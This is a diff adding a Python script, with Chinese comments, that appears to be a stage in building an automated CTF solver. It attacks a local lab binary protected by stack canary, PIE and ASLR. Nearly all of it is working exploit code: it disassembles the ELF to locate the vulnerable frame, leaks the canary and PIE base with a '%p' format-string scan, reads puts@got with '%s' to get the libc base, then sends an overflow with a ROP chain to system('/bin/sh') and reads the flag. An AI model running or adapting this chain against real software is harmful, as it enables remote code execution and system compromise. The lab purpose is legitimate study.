@@ -1,0 +1,678 @@
+"""
+v018_three_protections.src — canary + PIE + ret2libc 三保护组合
+
+为什么这是最难的一档
+    v015 解决了 canary / PIE 的绕过，v016 解决了 libc 基址与 system 调用，
+    但真实题通常三者同时开：溢出被 canary 挡住、代码地址被 PIE 随机化、
+    程序里又没有 system。必须在一个进程里依次拿到三样东西，再一次性打穿。
+
+信息流（全部在同一进程内，缺一不可）
+    round 1  格式化字符串 `%p` 扫描
+             → 用缓冲区标记值定位 varargs 下标 idx0
+             → canary 在 buffer + canary_offset（由反汇编推导）
+             → 保存的返回地址在 buffer + ret_offset，减去 main 中的静态偏移得到 PIE 基址
+    round 2  `%<idx0+2>$s` 读 puts@got（地址 = PIE 基址 + 静态 GOT 偏移）
+             → 泄漏 puts 的运行时地址 → 减 libc 偏移得到 libc 基址
+             → 页对齐校验识别 libc 版本是否匹配
+    round 3  padding + canary + saved rbp + [对齐 ret] + pop_rdi + binsh + system
+             → shell 里 cat flag
+
+为什么必须同进程
+    ASLR 每次运行都变。先跑一次拿泄漏、再跑一次用泄漏，必然失败（LAW-0019）。
+
+测什么
+    T1  三保护全开（canary + PIE + libc） → 解出
+    N1  模拟 libc 版本不匹配（用错 puts 偏移） → `libc_mismatch` 并拒绝
+    N2  没有 printf 泄漏原语 → `leak_failed` 并拒绝
+
+运行
+    python versions/v018_three_protections.src
+    python versions/v018_three_protections.src --only T1
+
+产出物
+    experiments/EXP-0016/{lab/,results.json,report.md}
+    experiments/EXP-0016/lab/{vuln4.c,vuln4,vuln4_noleak,libc.so.6}
+"""
+
+from __future__ import annotations
+
+import json
+import re
+import struct
+import subprocess
+import sys
+import threading
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0016"
+LAB_DIR = OUT_DIR / "lab"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+EXPECTED = "flag{three_protections}"
+
+
+def wsl_path(win_path: str) -> str:
+    p = Path(win_path).resolve()
+    drive = p.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(p)[2:].replace("\\", "/")
+
+
+# --------------------------------------------------------------------------------------
+# ELF 静态分析
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    path: str
+    is_pie: bool
+    has_canary: bool
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    text_addr: int = 0
+    text_size: int = 0
+    text_data: bytes = b""
+
+
+def elf_info(path: str) -> ElfFacts:
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        is_pie = elf["e_type"] == "ET_DYN"
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        text = elf.get_section_by_name(".text")
+        text_addr, text_size, text_data = text["sh_addr"], text["sh_size"], text.data()
+
+    return ElfFacts(path=path, is_pie=is_pie,
+                    has_canary="__stack_chk_fail" in imports,
+                    symbols=symbols, imports=imports,
+                    text_addr=text_addr, text_size=text_size, text_data=text_data)
+
+
+def plt_stub(path: str, symbol: str) -> dict:
+    """解析 .rela.plt 与 .plt / .plt.sec，返回可调用桩与 GOT 的静态偏移。
+
+    与 v016 相同：现代 Ubuntu 的调用目标在 .plt.sec，`.plt` 只是 resolver 入口。
+    """
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        plt = elf.get_section_by_name(".plt")
+        rela = elf.get_section_by_name(".rela.plt")
+        if plt is None or rela is None:
+            return {"ok": False, "reason": "plt_or_rela_missing"}
+
+        symtab = elf.get_section(rela["sh_link"])
+        index_of: dict[int, tuple[str, int]] = {}
+        for index, relocation in enumerate(rela.iter_relocations()):
+            name = ""
+            if relocation["r_info_sym"]:
+                name = symtab.get_symbol(relocation["r_info_sym"]).name
+            index_of[index] = (name, relocation["r_offset"])
+
+        engine = Cs(CS_ARCH_X86, CS_MODE_64)
+        stub_start = None
+        target_index = None
+        stubs: dict[int, int] = {}
+        for instruction in engine.disasm(plt.data(), plt["sh_addr"]):
+            if instruction.mnemonic == "endbr64":
+                stub_start = instruction.address
+            elif instruction.mnemonic == "push":
+                try:
+                    target_index = int(instruction.op_str, 0)
+                except ValueError:
+                    target_index = None
+            elif target_index is not None and "jmp" in instruction.mnemonic:
+                if stub_start is not None:
+                    stubs[target_index] = stub_start
+                target_index = None
+
+        plt_sec = elf.get_section_by_name(".plt.sec")
+        got_to_sec: dict[int, int] = {}
+        if plt_sec is not None:
+            sec_stub = None
+            for instruction in engine.disasm(plt_sec.data(), plt_sec["sh_addr"]):
+                if instruction.mnemonic == "endbr64":
+                    sec_stub = instruction.address
+                elif "jmp" in instruction.mnemonic and "rip" in instruction.op_str:
+                    match = re.search(r"\[rip \+ (0x[0-9a-fA-F]+)\]", instruction.op_str)
+                    if match and sec_stub is not None:
+                        got = instruction.address + instruction.size + int(match.group(1), 16)
+                        got_to_sec[got] = sec_stub
+
+    for index, (name, got) in index_of.items():
+        if name == symbol and index in stubs:
+            return {"ok": True, "plt": got_to_sec.get(got, stubs[index]),
+                    "plt_legacy": stubs[index], "got": got, "index": index}
+    return {"ok": False, "reason": "symbol_not_in_plt"}
+
+
+def libc_offsets(path: str) -> dict:
+    from elftools.elf.elffile import ELFFile
+
+    raw = Path(path).read_bytes()
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        symbols: dict[str, int] = {}
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if symbol.name and symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        file_offset = raw.find(b"/bin/sh\x00")
+        if file_offset < 0:
+            return {"ok": False, "reason": "binsh_not_found"}
+        binsh_vaddr = None
+        for segment in elf.iter_segments():
+            if segment["p_type"] != "PT_LOAD":
+                continue
+            start, end = segment["p_offset"], segment["p_offset"] + segment["p_filesz"]
+            if start <= file_offset < end:
+                binsh_vaddr = segment["p_vaddr"] + (file_offset - start)
+                break
+        if binsh_vaddr is None:
+            return {"ok": False, "reason": "binsh_not_mapped"}
+
+    missing = [name for name in ("puts", "system") if name not in symbols]
+    if missing:
+        return {"ok": False, "reason": f"missing:{missing}"}
+    return {"ok": True, "puts": symbols["puts"], "system": symbols["system"],
+            "binsh": binsh_vaddr}
+
+
+# --------------------------------------------------------------------------------------
+# 栈帧布局：缓冲区 / canary / 返回地址（相对缓冲区）
+# --------------------------------------------------------------------------------------
+
+def analyze_layout(facts: ElfFacts, read_plt: int, printf_plt: int) -> dict:
+    """从反汇编推导布局。
+
+    识别 vuln 函数：同时调用 read@plt 与 printf@plt。
+        sub  rsp, FRAME
+        mov  rax, fs:0x28 ; mov [rbp-CANARY], rax
+        lea  rax, [rbp-BUF] ; ... ; call read@plt
+        lea  rax, [rbp-BUF] ; mov rdi, rax ; call printf@plt
+    返回：
+        buffer_slot    buf 相对 rbp 的偏移（rbp-BUF）
+        canary_offset  canary 相对 buf 的偏移
+        ret_offset     返回地址相对 buf 的偏移
+        main_return    调用 vuln 的下一条指令的静态偏移（PIE 基址的锚点）
+    """
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    instructions = list(engine.disasm(facts.text_data, facts.text_addr))
+
+    functions: list[dict] = []
+    current = None
+    for instruction in instructions:
+        if instruction.mnemonic == "endbr64":
+            current = {"start": instruction.address, "insns": []}
+            functions.append(current)
+        if current is not None:
+            current["insns"].append(instruction)
+
+    vuln_function = None
+    for function in functions:
+        targets = set()
+        for instruction in function["insns"]:
+            if instruction.mnemonic == "call":
+                try:
+                    targets.add(int(instruction.op_str, 0))
+                except ValueError:
+                    pass
+        if read_plt in targets and printf_plt in targets:
+            vuln_function = function
+            break
+    if vuln_function is None:
+        return {"ok": False, "reason": "vulnerable_function_not_found"}
+
+    buffer_slot = None
+    canary_slot = None
+    saw_fs = False
+    for instruction in vuln_function["insns"]:
+        op = instruction.op_str
+        if "fs:" in op and "0x28" in op:
+            saw_fs = True
+        elif saw_fs and instruction.mnemonic == "mov" and ", rax" in op:
+            match = re.search(r"\[rbp - (0x[0-9a-fA-F]+|\d+)\]", op)
+            if match:
+                canary_slot = int(match.group(1), 0)
+                saw_fs = False
+        elif instruction.mnemonic == "lea" and "rbp -" in op:
+            match = re.search(r"\[rbp - (0x[0-9a-fA-F]+|\d+)\]", op)
+            if match:
+                buffer_slot = int(match.group(1), 0)
+        elif instruction.mnemonic == "call":
+            try:
+                if int(instruction.op_str, 0) == read_plt:
+                    break
+            except ValueError:
+                pass
+
+    if buffer_slot is None or canary_slot is None:
+        return {"ok": False, "reason": "layout_not_found"}
+
+    main_return = None
+    for instruction in instructions:
+        if instruction.mnemonic == "call":
+            try:
+                if int(instruction.op_str, 0) == vuln_function["start"]:
+                    main_return = instruction.address + instruction.size
+                    break
+            except ValueError:
+                pass
+    if main_return is None:
+        return {"ok": False, "reason": "call_site_not_found"}
+
+    canary_offset = buffer_slot - canary_slot
+    if canary_offset <= 0:
+        return {"ok": False, "reason": "canary_below_buffer"}
+    return {"ok": True, "function_start": vuln_function["start"],
+            "buffer_slot": buffer_slot, "canary_slot": canary_slot,
+            "canary_offset": canary_offset, "ret_offset": buffer_slot + 8,
+            "main_return": main_return}
+
+
+# --------------------------------------------------------------------------------------
+# 交互式进程
+# --------------------------------------------------------------------------------------
+
+class Interactive:
+    def __init__(self, binary_wsl: str) -> None:
+        self.proc = subprocess.Popen(
+            ["wsl", "-e", binary_wsl], stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, bufsize=0)
+        self.buffer = bytearray()
+        self.lock = threading.Lock()
+        self.alive = True
+        threading.Thread(target=self._reader, daemon=True).start()
+
+    def _reader(self) -> None:
+        while True:
+            chunk = self.proc.stdout.read(1)
+            if not chunk:
+                self.alive = False
+                break
+            with self.lock:
+                self.buffer.extend(chunk)
+
+    def wait_prompts(self, count: int, timeout: float = 8.0) -> bytes | None:
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            with self.lock:
+                if self.buffer.count(b"input:\n") >= count:
+                    return bytes(self.buffer)
+            if not self.alive:
+                break
+            time.sleep(0.005)
+        with self.lock:
+            return bytes(self.buffer)
+
+    def segment(self, prompts: list[bytes], index: int) -> bytes:
+        """第 index 段：第 index 个 prompt 之后到下一个 prompt 之前。"""
+        with self.lock:
+            buf = bytes(self.buffer)
+        start = buf.find(b"input:\n")
+        for _ in range(index):
+            if start < 0:
+                return b""
+            start = buf.find(b"input:\n", start + len(b"input:\n"))
+        if start < 0:
+            return b""
+        start += len(b"input:\n")
+        end = buf.find(b"input:\n", start)
+        return buf[start:end] if end >= 0 else buf[start:]
+
+    def prompt_count(self) -> int:
+        with self.lock:
+            return self.buffer.count(b"input:\n")
+
+    def send(self, data: bytes) -> None:
+        try:
+            self.proc.stdin.write(data)
+            self.proc.stdin.flush()
+        except (BrokenPipeError, OSError):
+            pass
+
+    def snapshot(self) -> bytes:
+        with self.lock:
+            return bytes(self.buffer)
+
+    def close(self) -> None:
+        try:
+            self.proc.stdin.close()
+        except OSError:
+            pass
+        try:
+            self.proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            self.proc.kill()
+
+
+# --------------------------------------------------------------------------------------
+# 三轮泄漏 + 利用
+# --------------------------------------------------------------------------------------
+
+def round1_leak(proc: Interactive, canary_offset: int) -> dict:
+    """发 `AAAAAAAA%p,%p,...`，返回 idx0 / canary / saved_rip / 全部值。"""
+    slots_to_canary = canary_offset // 8
+    # 每个值占 3 字节（"%p,"），外加 8 字节标记与 1 字节终止 NUL；
+    # 整个格式串必须严格小于 canary_offset，否则会先写坏 canary。
+    safe_values = (canary_offset - 8 - 1) // 3
+    n_values = min(48, safe_values)
+    needed = 12 + slots_to_canary + 2 + 1   # 12 是 idx0 的保守上界
+    if n_values < needed:
+        return {"ok": False, "reason": "layout_too_tight",
+                "n_values": n_values, "needed": needed}
+
+    # 末尾必须补 NUL：read 不会终止字符串，printf 会继续读缓冲区里的残留字节；
+    # 残留里一旦有 '%' 就会变成额外的格式说明符（这也是真实的 fmt 利用细节）。
+    proc.send(b"AAAAAAAA" + b"%p," * n_values + b"\x00")
+    proc.wait_prompts(2)
+    if not proc.alive:
+        return {"ok": False, "reason": "process_died"}
+    if proc.prompt_count() < 2:
+        return {"ok": False, "reason": "timeout"}
+    segment = proc.segment([], 0)
+    if not segment.startswith(b"AAAAAAAA"):
+        return {"ok": False, "reason": "leak_failed"}
+    body = segment[len(b"AAAAAAAA"):]
+    tokens = body.split(b",")
+    values: list[int] = []
+    for token in tokens:
+        token = token.strip()
+        if not token.startswith(b"0x") and token != b"(nil)":
+            continue
+        try:
+            values.append(0 if token == b"(nil)" else int(token, 16))
+        except ValueError:
+            values.append(0)
+    if len(values) < n_values:
+        return {"ok": False, "reason": "leak_parse_failed", "parsed": len(values)}
+
+    marker_positions = [i for i, value in enumerate(values) if value == 0x4141414141414141]
+    if not marker_positions:
+        return {"ok": False, "reason": "marker_not_found", "values": values[:16]}
+    marker_index = marker_positions[0]          # 0-based；对应 vararg 下标 marker_index+1
+    idx0 = marker_index + 1                     # buffer[0] 的 vararg 下标
+
+    canary_list_index = marker_index + slots_to_canary
+    ret_list_index = canary_list_index + 2
+    if ret_list_index >= len(values):
+        return {"ok": False, "reason": "index_out_of_range",
+                "marker_index": marker_index, "ret_list_index": ret_list_index}
+    canary = values[canary_list_index]
+    saved_rip = values[ret_list_index]
+    if canary & 0xFF:
+        return {"ok": False, "reason": "canary_not_aligned_zero", "canary": hex(canary),
+                "marker_index": marker_index}
+    return {"ok": True, "idx0": idx0, "marker_index": marker_index,
+            "canary": canary, "saved_rip": saved_rip,
+            "canary_list_index": canary_list_index}
+
+
+def round2_leak(proc: Interactive, idx0: int, pie_base: int,
+                puts_got: int) -> dict:
+    """把 puts@got 的运行时地址放进缓冲区偏移 16，用 `%<idx0+2>$s` 读它。"""
+    slot = idx0 + 2
+    spec = f"LIBC:%{slot}$s".encode()
+    if len(spec) > 16:
+        return {"ok": False, "reason": "spec_too_long", "spec": spec.decode()}
+    payload = spec + b" " * (16 - len(spec)) + struct.pack("<Q", pie_base + puts_got)
+    payload += b"\x00"       # 终止格式串，避免读到缓冲区残留
+    proc.send(payload)
+    proc.wait_prompts(3)
+    if not proc.alive:
+        return {"ok": False, "reason": "process_died"}
+    if proc.prompt_count() < 3:
+        return {"ok": False, "reason": "timeout"}
+    segment = proc.segment([], 1)
+    marker = segment.find(b"LIBC:")
+    if marker < 0:
+        return {"ok": False, "reason": "marker_not_found", "segment": segment[:80]}
+    raw = segment[marker + len(b"LIBC:"):][:6]
+    if not raw:
+        return {"ok": False, "reason": "empty_leak"}
+    leaked = int.from_bytes(raw + b"\x00" * (8 - len(raw)), "little")
+    return {"ok": True, "leaked": leaked, "raw_len": len(raw)}
+
+
+def build_stage3(canary: int, layout: dict, pie_base: int, libc_base: int,
+                 gadgets: dict, libc: dict, align: bool) -> bytes:
+    payload = b"A" * layout["canary_offset"]
+    payload += struct.pack("<Q", canary)
+    payload += struct.pack("<Q", 0)                      # saved rbp
+    if align:
+        payload += struct.pack("<Q", pie_base + gadgets["ret"])
+    payload += struct.pack("<Q", pie_base + gadgets["pop_rdi"])
+    payload += struct.pack("<Q", libc_base + libc["binsh"])
+    payload += struct.pack("<Q", libc_base + libc["system"])
+    return payload
+
+
+def solve_once(binary_path: str, libc_path: str, expected: str,
+               align: bool, fake_puts: int | None = None) -> dict:
+    started = time.perf_counter()
+    steps: list[dict] = []
+
+    facts = elf_info(binary_path)
+    steps.append({"unit": "elf_info", "pie": facts.is_pie, "canary": facts.has_canary})
+    if not (facts.is_pie and facts.has_canary):
+        return {"solved": False, "reason": "lab_not_three_protections", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    puts_stub = plt_stub(binary_path, "puts")
+    read_stub = plt_stub(binary_path, "read")
+    printf_stub = plt_stub(binary_path, "printf")
+    steps.append({"unit": "plt_stub", "puts_got": hex(puts_stub.get("got", 0)),
+                  "read_plt": hex(read_stub.get("plt", 0)),
+                  "printf_plt": hex(printf_stub.get("plt", 0))})
+    if not (puts_stub["ok"] and read_stub["ok"] and printf_stub["ok"]):
+        return {"solved": False, "reason": "plt_stub_missing", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    layout = analyze_layout(facts, read_stub["plt"], printf_stub["plt"])
+    steps.append({"unit": "analyze_layout",
+                  **{k: (hex(v) if isinstance(v, int) else v) for k, v in layout.items()}})
+    if not layout["ok"]:
+        return {"solved": False, "reason": layout["reason"], "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    libc = libc_offsets(libc_path)
+    steps.append({"unit": "libc_offsets",
+                  **({k: (hex(v) if isinstance(v, int) and not isinstance(v, bool) else v)
+                      for k, v in libc.items()})})
+    if not libc["ok"]:
+        return {"solved": False, "reason": f"libc_invalid:{libc.get('reason')}",
+                "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+    pop_rdi = facts.symbols.get("g4_pop_rdi")
+    align_ret = facts.symbols.get("g4_ret")
+    if pop_rdi is None or align_ret is None:
+        return {"solved": False, "reason": "gadget_missing", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+    gadgets = {"pop_rdi": pop_rdi, "ret": align_ret}
+
+    proc = Interactive(wsl_path(binary_path))
+    try:
+        proc.wait_prompts(1)
+        if not proc.alive or proc.prompt_count() < 1:
+            return {"solved": False, "reason": "process_start_failed", "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        # ---- round 1: canary + PIE ----
+        leak1 = round1_leak(proc, layout["canary_offset"])
+        steps.append({"unit": "round1_leak",
+                      **{k: (hex(v) if isinstance(v, int) else v) for k, v in leak1.items()}})
+        if not leak1["ok"]:
+            return {"solved": False, "reason": leak1["reason"], "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        pie_base = leak1["saved_rip"] - layout["main_return"]
+        steps.append({"unit": "solve_pie", "saved_rip": hex(leak1["saved_rip"]),
+                      "base": hex(pie_base), "page_aligned": (pie_base & 0xFFF) == 0})
+        if pie_base & 0xFFF or pie_base <= 0:
+            return {"solved": False, "reason": "pie_base_invalid", "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        # ---- round 2: libc ----
+        leak2 = round2_leak(proc, leak1["idx0"], pie_base, puts_stub["got"])
+        steps.append({"unit": "round2_leak",
+                      **{k: (hex(v) if isinstance(v, int) else v) for k, v in leak2.items()}})
+        if not leak2["ok"]:
+            return {"solved": False, "reason": leak2["reason"], "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        puts_offset = fake_puts if fake_puts is not None else libc["puts"]
+        libc_base = leak2["leaked"] - puts_offset
+        steps.append({"unit": "solve_libc", "base": hex(libc_base),
+                      "page_aligned": (libc_base & 0xFFF) == 0})
+        if libc_base & 0xFFF or libc_base <= 0:
+            return {"solved": False, "reason": "libc_mismatch", "steps": steps,
+                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+
+        # ---- round 3: 溢出 + ROP ----
+        stage3 = build_stage3(leak1["canary"], layout, pie_base, libc_base,
+                              gadgets, libc, align)
+        proc.send(stage3)
+        time.sleep(0.3)
+        proc.send(b"cat /tmp/flag.txt\n")
+        time.sleep(0.6)
+        text = proc.snapshot().decode("utf-8", "replace")
+        found = FLAG_RE.search(text)
+        ok = bool(found and found.group(0).lower() == expected.lower())
+        steps.append({"unit": "execute", "align": align,
+                      "result": "solved" if ok else "failed"})
+        return {"solved": ok, "reason": None if ok else "shell_failed", "steps": steps,
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}
+    finally:
+        proc.close()
+
+
+def solve(binary_path: str, libc_path: str, expected: str,
+          fake_puts: int | None = None) -> dict:
+    """先按 16 字节对齐的链打；失败则换一种对齐重来（ASLR 会刷新，必须整套重做）。"""
+    attempts = []
+    total_ms = 0.0
+    for align in (True, False):
+        result = solve_once(binary_path, libc_path, expected, align, fake_puts)
+        total_ms += result.get("elapsed_ms", 0.0)
+        attempts.append({"align": align, "solved": result["solved"],
+                         "reason": result["reason"],
+                         "elapsed_ms": result.get("elapsed_ms")})
+        if result["solved"]:
+            result["attempts"] = attempts
+            return result
+        # 只有"执行失败"才值得换对齐重试；泄漏阶段的失败重试也没用
+        if result.get("reason") != "shell_failed":
+            result["attempts"] = attempts
+            return result
+    return {"solved": False, "reason": "shell_failed", "steps": [], "attempts": attempts,
+            "elapsed_ms": round(total_ms, 1)}
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="canary + PIE + ret2libc")
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    subprocess.run(["wsl", "-e", "bash", "-lc", f"printf '{EXPECTED}\\n' > /tmp/flag.txt"],
+                   timeout=30, capture_output=True)
+
+    binary = LAB_DIR / "vuln4"
+    noleak = LAB_DIR / "vuln4_noleak"
+    libc = LAB_DIR / "libc.so.6"
+
+    cases = [
+        ("T1", str(binary), None, False, "三保护全开"),
+        ("N1", str(binary), 0x12345, True, "libc 版本不匹配（错偏移）"),
+        ("N2", str(noleak), None, True, "没有 printf 泄漏原语"),
+    ]
+
+    rows: list[dict] = []
+    for tid, bin_path, fake, negative, note in cases:
+        if args.only and tid != args.only:
+            continue
+        if not Path(bin_path).exists():
+            log(f"  {tid}: 跳过（靶场不存在：{bin_path}）")
+            continue
+        result = solve(bin_path, str(libc), EXPECTED, fake)
+        row = {"id": tid, "negative": negative, "note": note, **result}
+        rows.append(row)
+        if negative:
+            verdict = "OK(如实拒绝)" if not row["solved"] else "UNEXPECTED"
+        else:
+            verdict = "OK" if row["solved"] else "FAILED"
+        log(f"  {tid}: {verdict:12} {row.get('reason') or '':20} {row['elapsed_ms']}ms")
+
+    positives = [r for r in rows if not r["negative"]]
+    negatives = [r for r in rows if r["negative"]]
+    summary = {
+        "positive_total": len(positives),
+        "positive_solved": sum(1 for r in positives if r["solved"]),
+        "negative_total": len(negatives),
+        "negative_correctly_refused": sum(1 for r in negatives if not r["solved"]),
+        "mean_elapsed_ms": round(sum(r["elapsed_ms"] for r in rows) / max(len(rows), 1), 1),
+    }
+    log("汇总：" + json.dumps(summary, ensure_ascii=False))
+
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "rows": rows}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0016 — canary + PIE + ret2libc", "",
+             "同一进程内：`%p` 泄漏 canary 与 PIE 基址 → `%s` 泄漏 puts → ROP 调 system。", "",
+             "## 汇总", "", "```json",
+             json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "", "| 题 | 类型 | 结果 | 原因 | 耗时 |",
+             "| --- | --- | --- | --- | --- |"]
+    for row in rows:
+        if row["negative"]:
+            mark = "✓ 如实拒绝" if not row["solved"] else "✗ 不该解出"
+            kind = "负样本"
+        else:
+            mark = "✓ 解出" if row["solved"] else "✗ 失败"
+            kind = "正样本"
+        lines.append(f"| {row['id']} | {kind} | {mark} | {row.get('reason') or '—'} "
+                     f"| {row['elapsed_ms']}ms |")
+    (OUT_DIR / "report.md").write_text("\n".join(lines), encoding="utf-8")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
